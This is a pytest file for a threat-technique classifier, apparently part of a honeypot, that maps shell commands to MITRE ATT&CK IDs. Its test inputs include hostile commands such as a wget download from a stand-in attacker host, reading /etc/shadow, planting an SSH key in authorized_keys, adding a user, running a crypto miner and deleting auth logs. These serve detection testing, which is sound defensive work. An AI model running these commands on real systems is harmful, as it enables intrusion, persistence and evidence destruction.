"""Tests for :mod:`anglerfish.threat.techniques`."""

from __future__ import annotations

import re

import pytest

from anglerfish.threat.techniques import TECHNIQUES, TechniqueRule


def test_rule_post_init_validates_id() -> None:
    with pytest.raises(ValueError):
        TechniqueRule(id="", name="x", description="d")


def test_rule_post_init_validates_weight() -> None:
    with pytest.raises(ValueError):
        TechniqueRule(id="T0", name="x", description="d", weight=0)
    with pytest.raises(ValueError):
        TechniqueRule(id="T0", name="x", description="d", weight=51)


def test_rule_matches_command_name() -> None:
    rule = TechniqueRule(
        id="T0",
        name="x",
        description="d",
        commands=("whoami",),
    )
    assert rule.matches("whoami") is True
    assert rule.matches("/usr/bin/whoami") is True
    assert rule.matches("whoamiX") is False
    assert rule.matches("echo whoami") is False  # not the first token


def test_rule_matches_empty_command() -> None:
    rule = TechniqueRule(id="T0", name="x", description="d", commands=("whoami",))
    assert rule.matches("") is False
    assert rule.matches("   ") is False


def test_rule_matches_argument_pattern() -> None:
    rule = TechniqueRule(
        id="T0",
        name="x",
        description="d",
        commands=("cat",),
        argument_patterns=(re.compile(r"/etc/shadow"),),
    )
    # The command match alone triggers — argument_patterns is an OR.
    assert rule.matches("cat /etc/passwd") is True


def test_rule_matches_command_pattern() -> None:
    rule = TechniqueRule(
        id="T0",
        name="x",
        description="d",
        command_patterns=(re.compile(r"history\s+-c"),),
    )
    assert rule.matches("history -c") is True
    assert rule.matches("history -ca") is True
    assert rule.matches("ls") is False


def test_rule_argument_pattern_does_not_match_command_name() -> None:
    """argument_patterns are only applied to argv[1:]."""
    rule = TechniqueRule(
        id="T0",
        name="x",
        description="d",
        commands=("ls",),
        argument_patterns=(re.compile(r"\bls\b"),),
    )
    # tokens[1:] for "ls" alone is empty, so the pattern can't match,
    # but the command name match makes this True anyway.
    assert rule.matches("ls") is True


def test_rule_falls_back_to_whitespace_split_on_shlex_error() -> None:
    rule = TechniqueRule(id="T0", name="x", description="d", commands=("echo",))
    # Unterminated quote — shlex.split raises ValueError, we fall back.
    assert rule.matches('echo "unterminated') is True


def test_persistence_techniques_present_in_default_set() -> None:
    persistence_ids = {r.id for r in TECHNIQUES if r.persistence}
    assert "T1053" in persistence_ids  # cron
    assert "T1098" in persistence_ids  # authorized_keys
    assert "T1136" in persistence_ids  # useradd
    assert "T1543" in persistence_ids  # systemd unit install


def test_default_set_all_unique_ids() -> None:
    ids = [r.id for r in TECHNIQUES]
    assert len(ids) == len(set(ids))


@pytest.mark.parametrize(
    ("command", "expected_id"),
    [
        ("whoami", "T1033"),
        ("uname -a", "T1082"),
        ("ls /etc", "T1083"),
        ("ps -ef", "T1057"),
        ("ip addr show", "T1016"),
        ("netstat -ntlp", "T1049"),
        ("nmap 10.0.0.0/24", "T1046"),
        ("cat /etc/shadow", "T1003"),
        ("wget http://evil.example/x.sh", "T1105"),
        ("crontab -e", "T1053"),
        ("useradd -m attacker", "T1136"),
        ("systemctl enable evil.service", "T1543"),
        ("history -c", "T1070"),
        ("./xmrig --pool stratum+tcp://x:1234", "T1496"),
    ],
)
def test_known_command_triggers_expected_technique(
    command: str,
    expected_id: str,
) -> None:
    matched = {r.id for r in TECHNIQUES if r.matches(command)}
    assert expected_id in matched, f"{command!r} did not match {expected_id}"


def test_authorized_keys_command_matches_t1098() -> None:
    matched = {
        r.id
        for r in TECHNIQUES
        if r.matches('echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys')
    }
    assert "T1098" in matched


def test_indicator_removal_log_truncation() -> None:
    matched = {r.id for r in TECHNIQUES if r.matches("rm -rf /var/log/auth.log")}
    assert "T1070" in matched
